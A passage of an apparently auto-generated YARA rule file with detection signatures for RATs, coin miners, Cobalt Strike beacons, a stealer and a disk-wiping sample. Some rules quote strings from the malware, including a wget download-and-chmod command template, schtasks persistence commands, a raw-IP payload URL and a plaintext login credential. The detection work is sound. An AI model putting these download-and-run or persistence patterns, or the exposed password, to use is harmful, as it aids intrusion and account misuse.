      $s11 = "PrintPreviewDialog2.Icon" fullword wide /* score: '12.00'*/
      $s12 = "PrintPreviewDialog3.Icon" fullword wide /* score: '12.00'*/
      $s13 = "PrintPreviewDialog4.Icon" fullword wide /* score: '12.00'*/
      $s14 = "PrintPreviewDialog5.Icon" fullword wide /* score: '12.00'*/
      $s15 = "PrintPreviewDialog6.Icon" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule DarkVisionRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__73fbb0ff {
   meta:
      description = "_subset_batch - file DarkVisionRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_73fbb0ff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73fbb0ff8f68a724d25d2b5aaf538328765354a0b91298ce8e292649c3642cdf"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $x2 = "C:\\10\\boot\\Downloader_winer\\DownloaderApp\\DownloaderApp\\obj\\Release\\DownloaderApp.pdb" fullword ascii /* score: '37.00'*/
      $s3 = "svchostmanager.exe" fullword wide /* score: '27.00'*/
      $s4 = "svchostam.exe" fullword wide /* score: '27.00'*/
      $s5 = "svchosthelper.exe" fullword wide /* score: '27.00'*/
      $s6 = "systemhelper.exe" fullword wide /* score: '25.00'*/
      $s7 = "DownloaderService" fullword wide /* score: '22.00'*/
      $s8 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s9 = "<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" fullword wide /* score: '17.00'*/
      $s10 = "\" start= auto DisplayName= \"Windows Download Service\"" fullword wide /* score: '13.00'*/
      $s11 = "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" fullword wide /* score: '11.00'*/
      $s12 = "/c schtasks /create /tn \"" fullword wide /* score: '11.00'*/
      $s13 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s14 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s15 = "y90dmtnwLVWg.seawrJ.UWW" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1bf1fe69d3b6fbfc4673e803ff61b6c531f9058af35251db4eed11373a719e0c"
   strings:
      $s1 = "Hfcz.exe" fullword wide /* score: '22.00'*/
      $s2 = "user@example.com" fullword wide /* score: '21.00'*/
      $s3 = "Ampersand '&' should be encoded as '&amp;'" fullword wide /* score: '16.00'*/
      $s4 = "Attribute syntax error - attributes should be in format: name=\"value\"" fullword wide /* score: '15.00'*/
      $s5 = "Hfcz.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "HTML_Validation_Errors.txt" fullword wide /* score: '14.00'*/
      $s7 = "get_HTMLVersion" fullword ascii /* score: '12.00'*/
      $s8 = "get_SaveValidationReports" fullword ascii /* score: '12.00'*/
      $s9 = "Line {0}: {1} - {2}" fullword wide /* score: '12.00'*/
      $s10 = "Export Complete" fullword wide /* score: '12.00'*/
      $s11 = "Help - HTML Validator" fullword wide /* score: '12.00'*/
      $s12 = "P@@@@@" fullword ascii /* reversed goodware string '@@@@@P' */ /* score: '11.00'*/
      $s13 = "Empty Content" fullword wide /* score: '11.00'*/
      $s14 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s15 = "btnExportErrors" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__29a18b2e {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_29a18b2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "29a18b2e7ac7681c4c7c2754c0e2508403a865596d822961512f63386153318c"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD#sY" fullword ascii /* score: '27.00'*/
      $s2 = "rvNQ.exe" fullword wide /* score: '22.00'*/
      $s3 = "Event Log Analysis Report - " fullword wide /* score: '20.00'*/
      $s4 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '19.00'*/
      $s5 = "Error getting statistics for event log '" fullword wide /* score: '17.00'*/
      $s6 = "Error getting available event logs: " fullword wide /* score: '17.00'*/
      $s7 = "Error getting entry count for event log '" fullword wide /* score: '17.00'*/
      $s8 = "Event Log Analyzer - v1.0" fullword wide /* score: '17.00'*/
      $s9 = "EventLogAnalyzer.Forms.ErrorPatternForm.resources" fullword ascii /* score: '15.00'*/
      $s10 = "UpdateLogInfo" fullword ascii /* score: '15.00'*/
      $s11 = "labelLogInfo" fullword wide /* score: '15.00'*/
      $s12 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s13 = "Error reading event log '" fullword wide /* score: '15.00'*/
      $s14 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.csv" fullword wide /* score: '15.00'*/
      $s15 = "<GetEventLogStatistics>b__5_0" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule CobaltStrike_signature__147442e63270e287ed57d33257638324_imphash_ {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_147442e63270e287ed57d33257638324(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bc66f2d5329a171291bfd55b5447f97b631c825e5119fe28983c7c3f745d9859"
   strings:
      $s1 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule CobaltStrike_signature__147442e63270e287ed57d33257638324_imphash__55a914e2 {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_147442e63270e287ed57d33257638324(imphash)_55a914e2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "55a914e23ef743c5dd3b052f3a9ef17a3817e31a138972cf28878d4fc5c69e94"
   strings:
      $s1 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
      $s2 = "brntbpj" fullword ascii /* score: '8.00'*/
      $s3 = "lfvnlbvflo" fullword ascii /* score: '8.00'*/
      $s4 = "kskA%MhB%M`C" fullword ascii /* score: '8.00'*/
      $s5 = "nbvfdnvi" fullword ascii /* score: '8.00'*/
      $s6 = "fvnlbvflo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      all of them
}

rule CobaltStrike_signature__147442e63270e287ed57d33257638324_imphash__7d9a831d {
   meta:
      description = "_subset_batch - file CobaltStrike(signature)_147442e63270e287ed57d33257638324(imphash)_7d9a831d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d9a831dc5c66eb1df2cfa737c5a452b6dcc150c38f1036a2941db6105f3e612"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                         ' */ /* score: '26.50'*/
      $s2 = "PAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii /* base64 encoded string '<                                                         ' */ /* score: '16.50'*/
      $s3 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server" fullword ascii /* score: '13.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      all of them
}

rule DarkVisionRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DarkVisionRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7dcf8737120dc2472d5166e0397d6ff8cf79667b6f24aaa5430f1ca9db705310"
   strings:
      $s1 = "done.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule bb792251acb05abe97ca885d4b4e8768_imphash_ {
   meta:
      description = "_subset_batch - file bb792251acb05abe97ca885d4b4e8768(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "69934dc1d4fdb552037774ee7a75c20608c09680128c9840b508551dbcf463ad"
   strings:
      $x1 = "--disable-background-networking --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-breakpa" ascii /* score: '37.00'*/
      $x2 = "cmd.exe /c \"" fullword ascii /* score: '33.00'*/
      $x3 = "Windows.System.ProcessorArchitecture" fullword wide /* reversed goodware string 'erutcetihcrArossecorP.metsyS.swodniW' */ /* score: '32.00'*/
      $s4 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s5 = "Windows.System.VirtualKey" fullword wide /* reversed goodware string 'yeKlautriV.metsyS.swodniW' */ /* score: '27.00'*/
      $s6 = "Windows.System.VirtualKeyModifiers" fullword wide /* reversed goodware string 'sreifidoMyeKlautriV.metsyS.swodniW' */ /* score: '27.00'*/
      $s7 = "Windows.Web.Http.HttpCookieCollection" fullword wide /* reversed goodware string 'noitcelloCeikooCpttH.pttH.beW.swodniW' */ /* score: '26.00'*/
      $s8 = "Windows.Web.Http.HttpCompletionOption" fullword wide /* reversed goodware string 'noitpOnoitelpmoCpttH.pttH.beW.swodniW' */ /* score: '26.00'*/
      $s9 = "Windows.UI.Core.CoreProcessEventsOption" fullword wide /* reversed goodware string 'noitpOstnevEssecorPeroC.eroC.IU.swodniW' */ /* score: '25.00'*/
      $s10 = "s --disable-features=site-per-process --disable-hang-monitor --disable-ipc-flooding-protection --disable-popup-blocking --disabl" ascii /* score: '24.00'*/
      $s11 = "os.execCommand" fullword ascii /* score: '24.00'*/
      $s12 = "Windows.System.RemoteSystems.RemoteSystemPlatform" fullword wide /* score: '24.00'*/
      $s13 = "os.getSpawnedProcesses" fullword ascii /* score: '23.00'*/
      $s14 = "Windows.Web.WebErrorStatus" fullword wide /* reversed goodware string 'sutatSrorrEbeW.beW.swodniW' */ /* score: '23.00'*/
      $s15 = "Windows.System.AppExecutionStateChangeResult" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule AurotunStealer_signature__0e531ed9037ef0ab63aba0acf8b12aff_imphash_ {
   meta:
      description = "_subset_batch - file AurotunStealer(signature)_0e531ed9037ef0ab63aba0acf8b12aff(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a8ac40da7f243063370948e3a9d1c2f6d9ff5574d313631808b57b1040e99f7b"
   strings:
      $x1 = "C:\\Users\\User\\Documents\\GitHub\\Sonic\\Stub\\out\\build\\x64-release\\SonicCrypt.pdb" fullword ascii /* score: '31.00'*/
      $s2 = ".?AV?$_Ref_count_obj2@V?$wincolor_stderr_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@@std@@" fullword ascii /* score: '20.00'*/
      $s3 = ".?AV?$rotating_file_sink@Unull_mutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s4 = ".?AV?$wincolor_sink@Uconsole_nullmutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s5 = ".?AV?$_Ref_count_obj2@V?$wincolor_stderr_sink@Uconsole_nullmutex@details@spdlog@@@sinks@spdlog@@@std@@" fullword ascii /* score: '20.00'*/
      $s6 = ".?AV?$basic_file_sink@Vmutex@std@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s7 = ".?AV?$wincolor_stderr_sink@Uconsole_nullmutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s8 = ".?AV?$wincolor_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s9 = ".?AV?$base_sink@Unull_mutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s10 = ".?AV?$_Ref_count_obj2@V?$basic_file_sink@Vmutex@std@@@sinks@spdlog@@@std@@" fullword ascii /* score: '20.00'*/
      $s11 = ".?AV?$wincolor_stdout_sink@Uconsole_nullmutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s12 = ".?AV?$rotating_file_sink@Vmutex@std@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s13 = ".?AV?$wincolor_stdout_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
      $s14 = ".?AV?$_Ref_count_obj2@V?$wincolor_stdout_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@@std@@" fullword ascii /* score: '20.00'*/
      $s15 = ".?AV?$wincolor_stderr_sink@Uconsole_mutex@details@spdlog@@@sinks@spdlog@@" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 24000KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8fefb69d973b668a8c553cc6f3364abab385999d051995092d74ff2065b9e422"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s6 = "*FpvF:\"J-" fullword ascii /* score: '10.00'*/
      $s7 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s8 = "* 8*Zp" fullword ascii /* score: '9.00'*/
      $s9 = "* )jr@D" fullword ascii /* score: '9.00'*/
      $s10 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s11 = "G/getwlstatus" fullword ascii /* score: '9.00'*/
      $s12 = "* !yiG'" fullword ascii /* score: '9.00'*/
      $s13 = "YZaX%w%#" fullword ascii /* score: '8.00'*/
      $s14 = "GBzb!." fullword ascii /* score: '8.00'*/
      $s15 = "1yk_%I%Sk^|{QykW'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 24000KB and
      8 of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash__0e98a155 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash)_0e98a155.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0e98a1557be915d03718f7852f6f7b94e85de23c27c88bef58617c0247c6441a"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "DYD85T2U4" fullword ascii /* base64 encoded string '`?9Oe8' */ /* score: '11.00'*/
      $s6 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s7 = "<WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s8 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s9 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s10 = "nRAt-'#" fullword ascii /* score: '9.00'*/
      $s11 = "rfppksu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 23000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5218cff6 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5218cff6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5218cff65a1ba62ee2b28d5d26bf510393198f6a2ed833a2ffa7880ddcac7eb5"
   strings:
      $x1 = "^Copyright 2013 Google Inc. All Rights Reserved.Noto Sans Tagalog103uhRegularMonotype Imaging - Noto Sans TagalogNoto Sans Tagal" wide /* score: '41.00'*/
      $x2 = "Copyright 2019 Google Inc. All Rights Reserved.Noto Sans GurmukhiRegular2.001;GOOG;NotoSansGurmukhi-RegularNoto Sans Gurmukhi Re" wide /* score: '40.00'*/
      $x3 = "8Copyright 2019 Google LLC. All Rights Reserved.Noto Sans GeorgianRegular2.001;GOOG;NotoSansGeorgian-RegularNoto Sans Georgian R" wide /* score: '38.00'*/
      $x4 = "pCopyright 2019 Google Inc. All Rights Reserved.Noto Sans HebrewRegular3.000;GOOG;NotoSansHebrew-RegularNoto Sans Hebrew Regular" wide /* score: '38.00'*/
      $x5 = "Copyright 2018 Google LLC. All Rights Reserved.Noto Sans MultaniRegular2.000;GOOG;NotoSansMultani-RegularNoto Sans Multani Regul" wide /* score: '38.00'*/
      $x6 = "Copyright 2019 Google LLC. All Rights Reserved.Noto Sans Ol ChikiBold2.002;GOOG;NotoSansOlChiki-BoldNoto Sans Ol Chiki BoldVersi" wide /* score: '38.00'*/
      $x7 = "Copyright 2019 Google LLC. All Rights Reserved.Noto Sans Ol ChikiRegular2.002;GOOG;NotoSansOlChiki-RegularNoto Sans Ol Chiki Reg" wide /* score: '38.00'*/
      $x8 = "Copyright 2015-2019 Google LLC. All Rights Reserved.Noto Serif ArmenianBold2.005;GOOG;NotoSerifArmenian-BoldNoto Serif Armenian " wide /* score: '38.00'*/
      $x9 = "(Copyright 2019 Google LLC. All Rights Reserved.Noto Serif GeorgianBold2.001;GOOG;NotoSerifGeorgian-BoldNoto Serif Georgian Bold" wide /* score: '38.00'*/
      $x10 = "@Copyright 2019 Google LLC. All Rights Reserved.Noto Serif GeorgianRegular2.001;GOOG;NotoSerifGeorgian-RegularNoto Serif Georgia" wide /* score: '38.00'*/
      $x11 = "VCopyright 2013 Google Inc. All Rights Reserved.Noto Sans Coptic103uhRegularMonotype Imaging - Noto Sans CopticNoto Sans Coptic1" wide /* score: '38.00'*/
      $x12 = "Copyright 2013 Google Inc. All Rights Reserved.Noto Sans Canadian Aboriginal103uhRegularMonotype Imaging - Noto Sans Canadian Ab" wide /* score: '37.00'*/
      $x13 = "\\Copyright 2012 Google Inc. All Rights Reserved.Noto Sans Thai UI104uhRegularMonotype Imaging - Noto Sans Thai UINoto Sans Thai" wide /* score: '37.00'*/
      $x14 = "\\Copyright 2016 Google Inc. All Rights Reserved.Noto Serif Tamil101uhBoldMonotype Imaging - Noto Serif Tamil BoldNoto Serif Tam" wide /* score: '37.00'*/
      $x15 = "Copyright 2018 Google Inc. All Rights Reserved.Noto Sans ElbasanRegular2.000;GOOG;NotoSansElbasan-RegularNoto Sans Elbasan Regul" wide /* score: '36.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      1 of ($x*)
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__48b97e7f {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_48b97e7f.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "48b97e7f406ceca804ee62b16ac6844080849c5a8ab75f8a229d0cb98fcc6310"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s4 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s5 = "BLACKHAWK.dll" fullword wide /* score: '23.00'*/
      $s6 = "processAttributes" fullword ascii /* score: '15.00'*/
      $s7 = "WriteProcessMemory" fullword wide /* score: '15.00'*/
      $s8 = "ReadProcessMemory" fullword wide /* score: '15.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "BLACKHAWK.pdb" fullword ascii /* score: '14.00'*/
      $s11 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s12 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
      $s13 = ".NETFramework,Version=v4.5.2" fullword ascii /* score: '10.00'*/
      $s14 = ".NET Framework 4.5.2" fullword ascii /* score: '10.00'*/
      $s15 = "BE6UlFZFGCxuloGvB8" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8511d75b {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8511d75b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8511d75b8567fa242dc95d725a74f744d481c9e3ecacfd0f200debb788a368c5"
   strings:
      $s1 = "Crypted.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule DiskWriter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eec13e2e8387f91276cc2b98247e6fadfa370dd2c6212d8d75362024b1a25a58"
   strings:
      $s1 = "Error running Llanitarium.exe" fullword wide /* score: '25.00'*/
      $s2 = "Llanitarium.exe" fullword wide /* score: '22.00'*/
      $s3 = "FINAL WARNING OF Llanitarium.exe" fullword wide /* score: '19.00'*/
      $s4 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s5 = "processInformationLength" fullword ascii /* score: '15.00'*/
      $s6 = "PayloadSetText" fullword ascii /* score: '13.00'*/
      $s7 = "Value must be within a range of 0 - 255." fullword wide /* score: '12.00'*/
      $s8 = "Value must be within a range of 0 - 360." fullword wide /* score: '12.00'*/
      $s9 = "Value must be within a range of 0 - 1." fullword wide /* score: '12.00'*/
      $s10 = "Do you accept the risk that this machine will not boot? unless you install a new operating system." fullword wide /* score: '12.00'*/
      $s11 = "processInformationClass" fullword ascii /* score: '11.00'*/
      $s12 = "IsThreadPrivilege" fullword ascii /* score: '10.00'*/
      $s13 = "You're about to run a malware called \"Llanitarium.exe\"." fullword wide /* score: '10.00'*/
      $s14 = "Decommit" fullword ascii /* score: '9.00'*/
      $s15 = "CirclePoint" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule CoinMiner_signature__2 {
   meta:
      description = "_subset_batch - file CoinMiner(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "72e86ab0f9dcfe6ac5e51b1ae2265250918303da88f269e9dcb02fb23a667f30"
   strings:
      $s1 = "__pthread_mutexattr_gettype" fullword ascii /* score: '23.00'*/
      $s2 = "__pthread_mutexattr_getkind_np" fullword ascii /* score: '23.00'*/
      $s3 = "wget -q %s -O %s && chmod +x %s" fullword ascii /* score: '23.00'*/
      $s4 = "__pthread_mutexattr_getpshared" fullword ascii /* score: '23.00'*/
      $s5 = "__pthread_mutex_destroy" fullword ascii /* score: '18.00'*/
      $s6 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s7 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s8 = "__pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s9 = "__pthread_mutex_trylock" fullword ascii /* score: '18.00'*/
      $s10 = "pthread_keys_mutex" fullword ascii /* score: '18.00'*/
      $s11 = "__pthread_mutexattr_setpshared" fullword ascii /* score: '18.00'*/
      $s12 = "__pthread_mutexattr_setkind_np" fullword ascii /* score: '18.00'*/
      $s13 = "__pthread_mutexattr_init" fullword ascii /* score: '18.00'*/
      $s14 = "__pthread_mutexattr_destroy" fullword ascii /* score: '18.00'*/
      $s15 = "__pthread_mutexattr_settype" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule bdf3b65a3b2abda30244ae652aafeae8_imphash_ {
   meta:
      description = "_subset_batch - file bdf3b65a3b2abda30244ae652aafeae8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4d3da539bfc706b98f76e9e74b428e414c708342f5faf1e9cd16bc13109b37fc"
   strings:
      $s1 = "http://101.126.11.168/xsh/update.exe" fullword wide /* score: '27.00'*/
      $s2 = "'user_name':'peisong','password':'xsh@291B930AE978','app_poi_code':'12613939','method':'get','url':'https://waimaiopen.meituan.c" wide /* score: '26.00'*/
      $s3 = "C:\\Windows\\SysWow64\\msvbvm60.dll\\3" fullword ascii /* score: '22.00'*/
      $s4 = "','method':'get','url':'https://waimaiopen.meituan.com/api/v1/shipping/list'}" fullword wide /* score: '22.00'*/
      $s5 = "jl_mt_url=https://waimaiopen.meituan.com/api/v1/poi/mget" fullword wide /* score: '22.00'*/
      $s6 = "SELECT DATE_FORMAT(riqi,'%m-%d') rq,round(dyy_lirun-dyy_tgf,2) maoli,round(dyy_lirun-dyy_tgf-dyy_psf,2) lirun,round((dyy_lirun-d" wide /* score: '20.50'*/
      $s7 = "https://api.hqshixian.com/admin/system/meituan/api" fullword wide /* score: '20.00'*/
      $s8 = "MSComDlg.CommonDialog" fullword ascii /* score: '19.00'*/
      $s9 = "xsh.exe" fullword wide /* score: '19.00'*/
      $s10 = "http://www.hqshixian.com/eb/toUpdateEbPeisongStatus.do" fullword wide /* score: '17.00'*/
      $s11 = "http://www.hqshixian.com//jlmt/toUpdateMtwmPeisongStatus.do" fullword wide /* score: '17.00'*/
      $s12 = "http://www.hqshixian.com/jlmt/shopInfo.do" fullword wide /* score: '17.00'*/
      $s13 = "http://www.hqshixian.com/eb/MT2EBUpdateArea.do" fullword wide /* score: '17.00'*/
      $s14 = "jl_mt_url=https://waimaiopen.meituan.com/api/v1/retail/list" fullword wide /* score: '17.00'*/
      $s15 = "jl_mt_url=https://waimaiopen.meituan.com/api/v1/retail/updateAppFoodCodeByNameAndSpec" fullword wide /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule d1e57a4bba53ae72639cd20d4607834f_imphash_ {
   meta:
      description = "_subset_batch - file d1e57a4bba53ae72639cd20d4607834f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a93221f0ec562b1954fbc890dbaae0d9dd4744b4cf79072912c467fc55538474"
   strings:
      $x1 = "%windir%\\system32\\zipfldr.dll" fullword wide /* score: '32.00'*/
      $s2 = "C:\\Windows\\system32\\msvbvm60.dll\\3" fullword ascii /* score: '30.00'*/
      $s3 = "B*\\AC:\\Users\\jmelo\\gourmetdesktop\\Update\\Updater\\Update.vbp" fullword wide /* score: '28.00'*/
      $s4 = "unzip32.dll" fullword ascii /* score: '23.00'*/
      $s5 = "C:\\Windows\\system32\\stdole2.tlb" fullword ascii /* score: '21.00'*/
      $s6 = "\\ssiimg2.dll" fullword wide /* score: '21.00'*/
      $s7 = "https://sistemagourmet.com" fullword wide /* score: '21.00'*/
      $s8 = "https://google.com" fullword wide /* score: '21.00'*/
      $s9 = "C:\\Windows\\System32\\MSCOMCTL.oca" fullword ascii /* score: '20.00'*/
      $s10 = "zip32.dll" fullword ascii /* score: '20.00'*/
      $s11 = "\\ssi001.dll" fullword wide /* score: '18.00'*/
      $s12 = "\\ssi002.dll" fullword wide /* score: '18.00'*/
      $s13 = "\\ssi003.dll" fullword wide /* score: '18.00'*/
      $s14 = "Scripting.FileSystemObject" fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s15 = "https://sistemagourmet.s3.us-west-1.amazonaws.com/version.txt" fullword wide /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule ce2c475461d57f222a6aa22f49420f804a43c2eb29abf8553457a7d30f7cb024_ce2c4754 {
   meta:
